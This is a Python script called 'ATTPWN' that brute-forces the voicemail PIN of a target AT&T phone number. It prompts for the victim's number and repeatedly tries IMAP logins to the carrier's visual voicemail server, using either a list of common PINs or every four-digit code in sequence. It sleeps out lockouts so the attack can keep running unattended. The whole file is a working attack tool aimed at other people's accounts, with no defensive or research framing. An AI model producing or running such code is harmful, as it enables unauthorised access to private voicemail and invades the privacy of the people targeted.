import imaplib
import art
import time

def cracker(x):
    try:
        conn = imaplib.IMAP4("vvm.mobile.att.net",143)
        conn.login(tarNum,str(x))
        conn.close()
        print("[+] "+str(x))
        input("Press enter to quit...")
        exit()
    except Exception as e:
        if "invalid phone number or password, please try again" in str(e):
            print("[-] "+str(x))
        elif "blocked" in str(e) or ("locked" in str(e)):
            print("[-] "+str(x))
            print("[!] Mailbox locked! Sleeping for one hour (try letting this run while you sleep...)")
            time.sleep(3601)
        else:
            print("[!] "+str(e))
            exitNow = input("Would you like to exit? ('Y' for yes, anything else for no): ")
            if exitNow == "Y":
                exit()

topPins = ["1111","2222","3333","4444","5555","6666","7777","8888","9999","0000","1234","6969","1010","0101","7890","6789","4321"]

art.tprint("ATTPWN")

tarNum = input("Enter target mobile number (must be att number!): ")

useTop = input("Use top pins? ('Y' to use, anything else to use incremental): ")

if useTop == "Y":
    for pin in topPins:
        cracker(pin)
else:
    for c in range(9999):
        cracker(str(c).zfill(4))
    
    
        

